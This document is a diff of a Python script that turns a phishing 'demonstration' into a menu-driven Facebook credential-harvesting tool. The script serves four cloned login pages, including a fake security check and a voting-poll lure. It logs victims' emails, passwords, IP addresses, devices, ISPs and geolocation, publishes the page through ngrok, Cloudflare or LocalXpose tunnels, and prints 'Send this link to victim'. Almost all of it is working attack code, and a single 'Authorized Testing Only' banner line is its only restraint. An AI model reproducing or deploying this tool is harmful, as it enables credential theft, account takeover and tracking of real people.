@@ -1,137 +1,51 @@
-
+#!/usr/bin/env python3
 """
-Facebook Phishing Demonstration
-Captures: Email/Username, Password, IP Address, Device Name, ISP, User-Agent
-Runs entirely in Python — no Apache/PHP required
+Facebook Phishing Tool - Menu Driven
+Captures: Email, Password, IP, Device, ISP, Location
 """
 
 import os
 import sys
 import json
+import time
 import socket
 import datetime
 import threading
+import subprocess
 import webbrowser
 from http.server import HTTPServer, BaseHTTPRequestHandler
-from urllib.parse import urlparse, parse_qs
+from urllib.parse import parse_qs
+from urllib.request import urlopen
 
-# ======================== CONFIGURATION ========================
-HOST = "0.0.0.0"
+# ======================== CONFIG ========================
 PORT = 8080
 LOG_FILE = "victims_data.txt"
-USE_IP_API = True  # Set False if no internet for geolocation
-# ===============================================================
+# ========================================================
 
-# ======================== LOGO ========================
-LOGO = """
-╔══════════════════════════════════════════════════╗
-║        FACEBOOK PHISHING SERVER v1.0             ║
-║     Authorized Penetration Testing Tool          ║
-╚══════════════════════════════════════════════════╝
-"""
-# ============================================================
-
-# ======================== FACEBOOK LOGIN PAGE ========================
-FACEBOOK_PAGE = """<!DOCTYPE html>
+# ======================== FACEBOOK PAGES ========================
+TRADITIONAL_PAGE = """<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Log In or Sign Up</title>
+    <title>Facebook - Log In</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: Helvetica, Arial, sans-serif;
-            background: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-        .container {
-            display: flex;
-            align-items: center;
-            max-width: 1000px;
-            padding: 20px;
-            gap: 60px;
-        }
+        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { display: flex; align-items: center; max-width: 1000px; padding: 20px; gap: 60px; }
         .left { flex: 1; }
-        .left h1 {
-            color: #1877f2;
-            font-size: 56px;
-            font-weight: 700;
-            margin-bottom: 10px;
-        }
-        .left p {
-            font-size: 24px;
-            color: #1c1e21;
-            line-height: 1.3;
-        }
+        .left h1 { color: #1877f2; font-size: 56px; font-weight: 700; margin-bottom: 10px; }
+        .left p { font-size: 24px; color: #1c1e21; line-height: 1.3; }
         .right { flex: 1; }
-        .login-box {
-            background: #fff;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
-            padding: 20px;
-            width: 396px;
-        }
-        .login-box input {
-            width: 100%;
-            padding: 14px 16px;
-            margin-bottom: 12px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 17px;
-            outline: none;
-        }
-        .login-box input:focus {
-            border-color: #1877f2;
-            box-shadow: 0 0 0 2px #e7f3ff;
-        }
-        .login-btn {
-            width: 100%;
-            padding: 12px;
-            background: #1877f2;
-            color: #fff;
-            border: none;
-            border-radius: 6px;
-            font-size: 20px;
-            font-weight: 700;
-            cursor: pointer;
-        }
+        .login-box { background: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); padding: 20px; width: 396px; }
+        .login-box input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; outline: none; }
+        .login-box input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
+        .login-btn { width: 100%; padding: 12px; background: #1877f2; color: #fff; border: none; border-radius: 6px; font-size: 20px; font-weight: 700; cursor: pointer; }
         .login-btn:hover { background: #166fe5; }
-        .forgot {
-            display: block;
-            text-align: center;
-            margin: 16px 0;
-            color: #1877f2;
-            font-size: 14px;
-            text-decoration: none;
-        }
+        .forgot { display: block; text-align: center; margin: 16px 0; color: #1877f2; font-size: 14px; text-decoration: none; }
         .forgot:hover { text-decoration: underline; }
         .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
-        .signup-btn {
-            display: block;
-            margin: 0 auto;
-            padding: 12px 24px;
-            background: #42b72a;
-            color: #fff;
-            border: none;
-            border-radius: 6px;
-            font-size: 17px;
-            font-weight: 700;
-            cursor: pointer;
-            text-align: center;
-        }
-        .signup-btn:hover { background: #36a420; }
-        .page-links {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 14px;
-            color: #1c1e21;
-        }
-        .page-links a { color: #1c1e21; font-weight: 700; text-decoration: none; }
-        .page-links a:hover { text-decoration: underline; }
+        .signup-btn { display: block; margin: 0 auto; padding: 12px 24px; background: #42b72a; color: #fff; border: none; border-radius: 6px; font-size: 17px; font-weight: 700; cursor: pointer; }        
     </style>
 </head>
 <body>
@@ -151,189 +65,163 @@ FACEBOOK_PAGE = """<!DOCTYPE html>
                 <div class="divider"></div>
                 <button class="signup-btn">Create new account</button>
             </div>
-            <div class="page-links">
-                <a href="#">Create a Page</a> for a celebrity, brand or business.
-            </div>
         </div>
     </div>
 </body>
 </html>"""
-# ============================================================
 
-# ======================== VICTIM INFO FUNCTIONS ========================
-def get_device_name(user_agent):
-    """Extract device/OS name from User-Agent string"""
-    ua = user_agent.lower()
-    
-    if "windows nt 10.0" in ua: return "Windows 10/11 PC"
-    if "windows nt 6.3" in ua:  return "Windows 8.1 PC"
-    if "windows nt 6.1" in ua:  return "Windows 7 PC"
-    if "windows nt 6.0" in ua:  return "Windows Vista PC"
-    if "windows nt 5.1" in ua:  return "Windows XP PC"
-    if "mac os x" in ua:
-        if "iphone" in ua:      return "iPhone"
-        if "ipad" in ua:        return "iPad"
-        return "macOS Device"
-    if "android" in ua:
-        if "mobile" in ua:      return "Android Phone"
-        return "Android Tablet"
-    if "linux" in ua:           return "Linux Device"
-    if "iphone" in ua:          return "iPhone"
-    if "ipad" in ua:            return "iPad"
-    if "crkey" in ua:           return "Chromebook"
+POLL_PAGE = """<!DOCTYPE html>
+<html>
+<head><title>Facebook - Voting Poll</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.box{background:#fff;border-radius:8px;padding:30px;width:450px;box-shadow:0 2px 4px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.1);text-align:center}
+.box h2{color:#1c1e21;margin-bottom:10px}
+.box p{color:#606770;margin-bottom:20px}
+.option{background:#f0f2f5;border:1px solid #dddfe2;border-radius:8px;padding:15px;margin:10px 0;cursor:pointer;font-size:16px}
+.option:hover{background:#e7f3ff;border-color:#1877f2}
+.option input{margin-right:10px}
+.submit-btn{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:18px;font-weight:700;cursor:pointer;margin-top:15px}
+.login-prompt{margin-top:15px;color:#606770;font-size:14px}
+.login-prompt a{color:#1877f2;text-decoration:none}
+</style>
+</head>
+<body>
+<div class="box">
+<h2>Which option do you prefer?</h2>
+<p>Vote and see live results</p>
+<form action="/login" method="POST">
+<div class="option"><input type="radio" name="vote" value="a"> Option A - Best Choice</div>
+<div class="option"><input type="radio" name="vote" value="b"> Option B - Great Alternative</div>
+<div class="option"><input type="radio" name="vote" value="c"> Option C - Not Sure</div>
+<button type="submit" class="submit-btn">Submit Vote</button>
+</form>
+<div class="login-prompt">To see results, <a href="#" onclick="document.getElementById('login-overlay').style.display='block'">Log in with Facebook</a></div>
+</div>
+<div id="login-overlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:none;justify-content:center;align-items:center">
+<div style="background:#fff;border-radius:8px;padding:20px;width:396px">
+<h3 style="text-align:center;margin-bottom:20px">Log in to Facebook</h3>
+<form action="/login" method="POST">
+<input type="text" name="email" placeholder="Email or phone" style="width:100%;padding:14px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;font-size:17px" required>
+<input type="password" name="pass" placeholder="Password" style="width:100%;padding:14px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;font-size:17px" required>
+<button type="submit" style="width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:18px;font-weight:700;cursor:pointer">Log In</button>
+</form>
+</div>
+</div>
+<script>document.querySelector('.login-prompt a').onclick=function(){document.getElementById('login-overlay').style.display='flex';return false}</script>
+</body>
+</html>"""
+
+SECURITY_PAGE = """<!DOCTYPE html>
+<html>
+<head><title>Facebook - Security Check</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.box{background:#fff;border-radius:8px;padding:30px;width:450px;box-shadow:0 2px 4px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.1);text-align:center}
+.box .icon{font-size:48px;margin-bottom:15px;color:#1877f2}
+.box h2{color:#1c1e21;margin-bottom:10px}
+.box p{color:#606770;margin-bottom:20px;font-size:14px}
+.security-badge{display:inline-block;background:#e7f3ff;padding:5px 10px;border-radius:4px;color:#1877f2;font-size:12px;margin-bottom:20px}
+.box input{width:100%;padding:14px 16px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;outline:none}
+.box input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
+.login-btn{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:18px;font-weight:700;cursor:pointer}
+</style>
+</head>
+<body>
+<div class="box">
+<div class="icon">&#128274;</div>
+<h2>Security Check Required</h2>
+<div class="security-badge">&#10003; Secured by SSL</div>
+<p>We noticed unusual activity from your account. Please verify your identity to continue.</p>
+<form action="/login" method="POST">
+<input type="text" name="email" placeholder="Email or phone number" required>
+<input type="password" name="pass" placeholder="Confirm your password" required>
+<button type="submit" class="login-btn">Verify Identity</button>
+</form>
+</div>
+</body>
+</html>"""
+
+MESSENGER_PAGE = """<!DOCTYPE html>
+<html>
+<head><title>Facebook Messenger</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.box{background:#fff;border-radius:8px;padding:30px;width:396px;box-shadow:0 2px 4px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.1);text-align:center}
+.messenger-logo{font-size:36px;color:#1877f2;font-weight:bold;margin-bottom:5px}
+.messenger-logo span{font-size:14px;color:#606770;display:block;font-weight:normal}
+.box h2{color:#1c1e21;margin-bottom:20px;font-size:18px}
+.box input{width:100%;padding:14px 16px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;outline:none}
+.box input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
+.login-btn{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:18px;font-weight:700;cursor:pointer}
+.login-btn:hover{background:#166fe5}
+.forgot{display:block;text-align:center;margin:16px 0;color:#1877f2;font-size:14px;text-decoration:none}
+</style>
+</head>
+<body>
+<div class="box">
+<div class="messenger-logo">messenger<span>from facebook</span></div>
+<h2>Log in to continue</h2>
+<form action="/login" method="POST">
+<input type="text" name="email" placeholder="Email or phone number" required autofocus>
+<input type="password" name="pass" placeholder="Password" required>
+<button type="submit" class="login-btn">Log In</button>
+</form>
+<a href="#" class="forgot">Forgotten password?</a>
+</div>
+</body>
+</html>"""
+# ========================================================
+
+# ======================== PAGES DICT ========================
+PAGES = {
+    "1": {"name": "Traditional Login Page", "html": TRADITIONAL_PAGE},
+    "2": {"name": "Advanced Voting Poll Login Page", "html": POLL_PAGE},
+    "3": {"name": "Fake Security Login Page", "html": SECURITY_PAGE},
+    "4": {"name": "Facebook Messenger Login Page", "html": MESSENGER_PAGE},
+}
+# ==========================================================
+
+# ======================== VICTIM INFO ========================
+def get_device(ua):
+    u = ua.lower()
+    if "nt 10" in u: return "Windows 10/11 PC"
+    if "nt 6.3" in u: return "Windows 8.1 PC"
+    if "nt 6.1" in u: return "Windows 7 PC"
+    if "mac os x" in u and "iphone" not in u and "ipad" not in u: return "macOS Device"
+    if "iphone" in u: return "iPhone"
+    if "ipad" in u: return "iPad"
+    if "android" in u: return "Android Device"
+    if "linux" in u: return "Linux Device"
     return "Unknown Device"
 
-
-def get_browser_name(user_agent):
-    """Extract browser name from User-Agent"""
-    ua = user_agent.lower()
-    
-    if "edg/" in ua:            return "Microsoft Edge"
-    if "chrome/" in ua and "chromium" not in ua:
-        if "opr/" in ua:        return "Opera"
-        if "samsungbrowser" in ua: return "Samsung Internet"
-        return "Google Chrome"
-    if "firefox/" in ua:        return "Mozilla Firefox"
-    if "safari/" in ua and "chrome" not in ua: return "Apple Safari"
-    if "trident/" in ua:        return "Internet Explorer"
-    return "Unknown Browser"
-
-
-def get_ip_info(ip_address):
-    """Get ISP, location, and org info from IP address"""
-    if not USE_IP_API:
-        return {
-            "isp": "N/A (IP API disabled)",
-            "org": "N/A",
-            "country": "N/A",
-            "region": "N/A",
-            "city": "N/A",
-            "lat": "N/A",
-            "lon": "N/A",
-            "timezone": "N/A"
-        }
-    
+def get_ip_info(ip):
     try:
-        import urllib.request
-        url = f"http://ip-api.com/json/{ip_address}?fields=status,country,regionName,city,isp,org,lat,lon,timezone,query"
-        with urllib.request.urlopen(url, timeout=5) as response:
-            data = json.loads(response.read().decode())
-            if data.get("status") == "success":
-                return {
-                    "isp": data.get("isp", "Unknown"),
-                    "org": data.get("org", "Unknown"),
-                    "country": data.get("country", "Unknown"),
-                    "region": data.get("regionName", "Unknown"),
-                    "city": data.get("city", "Unknown"),
-                    "lat": data.get("lat", "Unknown"),
-                    "lon": data.get("lon", "Unknown"),
-                    "timezone": data.get("timezone", "Unknown"),
-                }
-    except Exception as e:
-        print(f"[!] IP API error: {e}")
-    
-    return {
-        "isp": "Unknown",
-        "org": "Unknown",
-        "country": "Unknown",
-        "region": "Unknown",
-        "city": "Unknown",
-        "lat": "Unknown",
-        "lon": "Unknown",
-        "timezone": "Unknown",
-    }
+        with urlopen(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,lat,lon,timezone,query", timeout=5) as r:
+            d = json.load(r)
+        if d.get("status") == "success":
+            return d
+    except: pass
+    return {"isp": "Unknown", "org": "Unknown", "country": "Unknown", "regionName": "Unknown", "city": "Unknown", "lat": "N/A", "lon": "N/A", "timezone": "Unknown"}
+# ============================================================
 
-
-def get_hostname(ip_address):
-    """Reverse DNS lookup for hostname"""
-    try:
-        hostname, _, _ = socket.gethostbyaddr(ip_address)
-        return hostname
-    except:
-        return "No PTR record"
-
-
-def log_victim_data(email, password, client_ip, user_agent):
-    """Log all captured victim data to file"""
-    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    device = get_device_name(user_agent)
-    browser = get_browser_name(user_agent)
-    hostname = get_hostname(client_ip)
-    ip_info = get_ip_info(client_ip)
-    
-    # Build log entry
-    separator = "=" * 55
-    log_entry = f"""
-{separator}
-  NEW VICTIM CAPTURED
-{separator}
-  Timestamp  : {timestamp}
-  IP Address : {client_ip}
-  Hostname   : {hostname}
-  Device     : {device}
-  Browser    : {browser}
-  User-Agent : {user_agent}
-  ISP        : {ip_info['isp']}
-  Org        : {ip_info['org']}
-  Country    : {ip_info['country']}
-  Region     : {ip_info['region']}
-  City       : {ip_info['city']}
-  Location   : {ip_info['lat']}, {ip_info['lon']}
-  Timezone   : {ip_info['timezone']}
-{separator}
-  EMAIL/USER : {email}
-  PASSWORD   : {password}
-{separator}
-"""
-    
-    # Write to file
-    with open(LOG_FILE, "a", encoding="utf-8") as f:
-        f.write(log_entry)
-    
-    # Also print to console with colors
-    print(f"\n\033[91m{'='*55}\033[0m")
-    print(f"\033[91m  *** NEW VICTIM CAPTURED ***\033[0m")
-    print(f"\033[91m{'='*55}\033[0m")
-    print(f"  \033[93mTimestamp\033[0m  : {timestamp}")
-    print(f"  \033[93mIP Address\033[0m : {client_ip}")
-    print(f"  \033[93mHostname\033[0m   : {hostname}")
-    print(f"  \033[93mDevice\033[0m     : {device}")
-    print(f"  \033[93mBrowser\033[0m    : {browser}")
-    print(f"  \033[93mISP\033[0m        : {ip_info['isp']}")
-    print(f"  \033[93mOrg\033[0m        : {ip_info['org']}")
-    print(f"  \033[93mLocation\033[0m   : {ip_info['city']}, {ip_info['region']}, {ip_info['country']}")
-    print(f"  \033[93mCoords\033[0m     : {ip_info['lat']}, {ip_info['lon']}")
-    print(f"  \033[92mUSERNAME\033[0m   : {email}")
-    print(f"  \033[92mPASSWORD\033[0m   : {password}")
-    print(f"\033[91m{'='*55}\033[0m")
-    
-    return ip_info
-# ===========================================================
-
-# ======================== HTTP SERVER ========================
-class PhishingHandler(BaseHTTPRequestHandler):
-    """HTTP request handler for the phishing server"""
+# ======================== HTTP HANDLER ========================
+class PhishHandler(BaseHTTPRequestHandler):
+    page_html = TRADITIONAL_PAGE
     
     def do_GET(self):
-        """Serve the Facebook login page"""
-        parsed = urlparse(self.path)
-        path = parsed.path
-        
-        if path == "/":
+        if self.path == "/":
             self.send_response(200)
             self.send_header("Content-Type", "text/html; charset=utf-8")
-            self.send_header("Server", "Apache/2.4.41 (Ubuntu)")
-            self.send_header("Connection", "keep-alive")
             self.end_headers()
-            self.wfile.write(FACEBOOK_PAGE.encode("utf-8"))
-            print(f"\n[+] Page served to: {self.client_address[0]}")
-            return
-        
-        elif path == "/victims":
-            # View captured data via browser
+            self.wfile.write(self.page_html.encode())
+        elif self.path == "/victims":
             if os.path.exists(LOG_FILE):
                 self.send_response(200)
-                self.send_header("Content-Type", "text/plain; charset=utf-8")
+                self.send_header("Content-Type", "text/plain")
                 self.end_headers()
                 with open(LOG_FILE, "rb") as f:
                     self.wfile.write(f.read())
@@ -341,94 +229,219 @@ class PhishingHandler(BaseHTTPRequestHandler):
                 self.send_response(200)
                 self.send_header("Content-Type", "text/plain")
                 self.end_headers()
-                self.wfile.write(b"No victims captured yet.")
-            return
-        
-        elif path == "/clear":
-            # Clear log file
-            open(LOG_FILE, "w").close()
-            self.send_response(200)
-            self.send_header("Content-Type", "text/plain")
-            self.end_headers()
-            self.wfile.write(b"Log cleared.\n")
-            return
-        
+                self.wfile.write(b"No victims yet.")
         else:
             self.send_response(404)
-            self.send_header("Content-Type", "text/plain")
             self.end_headers()
-            self.wfile.write(b"404 Not Found")
+            self.wfile.write(b"Not Found")
     
     def do_POST(self):
-        """Handle login form submission"""
-        content_length = int(self.headers.get("Content-Length", 0))
-        post_data = self.rfile.read(content_length).decode("utf-8")
-        params = parse_qs(post_data)
+        length = int(self.headers.get("Content-Length", 0))
+        data = self.rfile.read(length).decode()
+        params = parse_qs(data)
         
-        # Extract credentials
         email = params.get("email", [""])[0]
         password = params.get("pass", [""])[0]
-        
-        # Get victim info
         client_ip = self.client_address[0]
         user_agent = self.headers.get("User-Agent", "Unknown")
+        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        device = get_device(user_agent)
+        info = get_ip_info(client_ip)
         
-        # Log everything
-        log_victim_data(email, password, client_ip, user_agent)
+        hostname = "Unknown"
+        try: hostname = socket.gethostbyaddr(client_ip)[0]
+        except: pass
         
-        # Redirect to real Facebook
+        log = f"""
+{'='*55}
+  NEW VICTIM CAPTURED
+{'='*55}
+  Timestamp  : {ts}
+  IP         : {client_ip}
+  Hostname   : {hostname}
+  Device     : {device}
+  User-Agent : {user_agent}
+  ISP        : {info.get('isp','Unknown')}
+  Org        : {info.get('org','Unknown')}
+  Country    : {info.get('country','Unknown')}
+  Region     : {info.get('regionName','Unknown')}
+  City       : {info.get('city','Unknown')}
+  Coords     : {info.get('lat','N/A')}, {info.get('lon','N/A')}
+  Timezone   : {info.get('timezone','Unknown')}
+{'='*55}
+  USERNAME   : {email}
+  PASSWORD   : {password}
+{'='*55}
+"""
+        
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(log)
+        
+        print(f"\033[92m\n[+] VICTIM CAPTURED!\033[0m")
+        print(f"    Email: {email}")
+        print(f"    Pass:  {password}")
+        print(f"    IP:    {client_ip}")
+        print(f"    ISP:   {info.get('isp','Unknown')}")
+        print(f"    Device: {device}")
+        print(f"    Location: {info.get('city','?')}, {info.get('country','?')}")
+        
         self.send_response(302)
         self.send_header("Location", "https://www.facebook.com")
         self.end_headers()
     
-    def log_message(self, format, *args):
-        """Suppress default HTTP server logging"""
-        pass
+    def log_message(self, *a): pass
+# ============================================================
 
-
-def start_server():
-    """Start the HTTP server"""
-    server = HTTPServer((HOST, PORT), PhishingHandler)
-    
-    print(LOGO)
-    print(f"\033[92m[+] Server started!\033[0m")
-    print(f"\033[92m[+] Local URL : http://localhost:{PORT}\033[0m")
-    
-    # Get local IP for LAN access
-    hostname = socket.gethostname()
-    local_ip = socket.gethostbyname(hostname)
-    print(f"\033[92m[+] LAN URL   : http://{local_ip}:{PORT}\033[0m")
-    
-    # Try to get public IP
+# ======================== TUNNELING ========================
+def start_ngrok():
+    print("[*] Starting Ngrok tunnel...")
     try:
-        import urllib.request
-        with urllib.request.urlopen("https://api.ipify.org", timeout=5) as resp:
-            public_ip = resp.read().decode()
-        print(f"\033[92m[+] Public IP : {public_ip}:{PORT} (use ngrok for HTTPS)\033[0m")
+        ngrok = subprocess.Popen(
+            ["ngrok", "http", str(PORT)],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+        time.sleep(3)
+        with urlopen("http://127.0.0.1:4040/api/tunnels") as r:
+            data = json.load(r)
+        url = data["tunnels"][0]["public_url"]
+        print(f"\033[92m[+] Ngrok URL: {url}\033[0m")
+        return url
     except:
-        print(f"\033[93m[!] Could not determine public IP\033[0m")
-    
-    print(f"\033[93m[!] View captured data: http://localhost:{PORT}/victims\033[0m")
-    print(f"\033[93m[!] Clear log: http://localhost:{PORT}/clear\033[0m")
-    print(f"\033[92m[+] Waiting for victims... (Ctrl+C to stop)\033[0m\n")
-    print(f"\033[90m{'='*55}\033[0m")
-    
+        print("\033[91m[!] Ngrok failed. Install: sudo apt install ngrok\033[0m")
+        return None
+
+def start_cloudflared():
+    print("[*] Starting Cloudflared tunnel...")
     try:
-        server.serve_forever()
-    except KeyboardInterrupt:
-        print(f"\n\n[!] Server stopped by user.")
-        print(f"[!] Log saved to: {LOG_FILE}")
-        server.server_close()
-        sys.exit(0)
-# ===========================================================
+        cf = subprocess.Popen(
+            ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT
+        )
+        time.sleep(4)
+        for line in iter(cf.stdout.readline, b''):
+            line = line.decode(errors='ignore')
+            if "https://" in line and ".trycloudflare.com" in line:
+                url = line[line.index("https://"):line.index(".trycloudflare.com")+18]
+                print(f"\033[92m[+] Cloudflared URL: {url}\033[0m")
+                return url
+        return None
+    except:
+        print("\033[91m[!] Cloudflared failed. Install: sudo apt install cloudflared\033[0m")
+        return None
+
+def start_localxpose():
+    print("[*] Starting LocalXpose tunnel (15 min limit)...")
+    try:
+        lx = subprocess.Popen(
+            ["loclx", "tunnel", "http", "--to", f"localhost:{PORT}"],
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT
+        )
+        time.sleep(4)
+        for line in iter(lx.stdout.readline, b''):
+            line = line.decode(errors='ignore')
+            if ".loclx.io" in line.lower():
+                for word in line.split():
+                    if ".loclx.io" in word:
+                        print(f"\033[92m[+] LocalXpose URL: {word.strip()}\033[0m")
+                        return word.strip()
+        return None
+    except:
+        print("\033[91m[!] LocalXpose failed. Install: sudo snap install localxpose\033[0m")
+        return None
+# ============================================================
+
+# ======================== BANNER ========================
+BANNER = """
+\033[91m
+███████╗ █████╗  ██████╗███████╗██████╗  ██████╗  ██████╗ ██╗  ██╗
+██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██║  ██║
+█████╗  ███████║██║     █████╗  ██████╔╝██║   ██║██║   ██║███████║
+██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗██║   ██║██║   ██║██╔══██║
+██║     ██║  ██║╚██████╗███████╗██████╔╝╚██████╔╝╚██████╔╝██║  ██║
+╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
+\033[0m
+\033[93m  Facebook Phishing Tool - Authorized Testing Only\033[0m
+\033[93m  Captures: Email, Password, IP, Device, ISP, Location\033[0m
+"""
+# ============================================================
 
 # ======================== MAIN ========================
+def main():
+    os.system("clear" if os.name == "posix" else "cls")
+    print(BANNER)
+    
+    # Menu 1: Select page type
+    print("\n\033[94m[01] Facebook\033[0m")
+    print("[-] Select an option : ", end="")
+    choice = input().strip()
+    
+    if choice != "1":
+        print("\033[91m[!] Invalid option. Defaulting to Facebook.\033[0m")
+    print()
+    
+    # Menu 2: Select page template
+    print("\033[94m[01] Traditional Login Page\033[0m")
+    print("[02] Advanced Voting Poll Login Page")
+    print("[03] Fake Security Login Page")
+    print("[04] Facebook Messenger Login Page\033[0m")
+    print("[-] Select an option : ", end="")
+    page_choice = input().strip()
+    
+    selected_page = PAGES.get(page_choice, PAGES["1"])
+    PhishHandler.page_html = selected_page["html"]
+    print(f"\n\033[92m[+] Selected: {selected_page['name']}\033[0m")
+    print()
+    
+    # Menu 3: Select tunnel method
+    print("\033[94m[01] Localhost")
+    print("[02] Ngrok.io     [Account Needed]")
+    print("[03] Cloudflared  [Auto Detects]")
+    print("[04] LocalXpose   [NEW! Max 15Min]\033[0m")
+    print("[-] Select an option : ", end="")
+    tunnel_choice = input().strip()
+    print()
+    
+    # Start server
+    server = HTTPServer(("0.0.0.0", PORT), PhishHandler)
+    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
+    server_thread.start()
+    
+    hostname = socket.gethostname()
+    local_ip = socket.gethostbyname(hostname)
+    
+    print(f"\033[92m[+] Server started on 0.0.0.0:{PORT}\033[0m")
+    print(f"\033[92m[+] Local:   http://localhost:{PORT}\033[0m")
+    print(f"\033[92m[+] LAN:     http://{local_ip}:{PORT}\033[0m")
+    
+    # Start tunnel
+    tunnel_url = None
+    if tunnel_choice == "2":
+        tunnel_url = start_ngrok()
+    elif tunnel_choice == "3":
+        tunnel_url = start_cloudflared()
+    elif tunnel_choice == "4":
+        tunnel_url = start_localxpose()
+    
+    if tunnel_url:
+        print(f"\n\033[92m[+] Send this link to victim: {tunnel_url}\033[0m")
+        webbrowser.open(tunnel_url)
+    else:
+        print(f"\n\033[92m[+] Send this link to victim: http://{local_ip}:{PORT}\033[0m")
+    
+    print(f"\n\033[93m[+] View captured data: http://localhost:{PORT}/victims\033[0m")
+    print(f"\033[93m[+] Log file: {LOG_FILE}\033[0m")
+    print(f"\033[93m[+] Press Ctrl+C to stop\033[0m")
+    
+    # Monitor log file
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print(f"\n\n\033[91m[!] Server stopped.\033[0m")
+        server.shutdown()
+
 if __name__ == "__main__":
-    # Check Python version
     if sys.version_info < (3, 6):
         print("[!] Python 3.6+ required")
         sys.exit(1)
-    
-    # Run server
-    start_server()
-# ===========================================================
+    main()
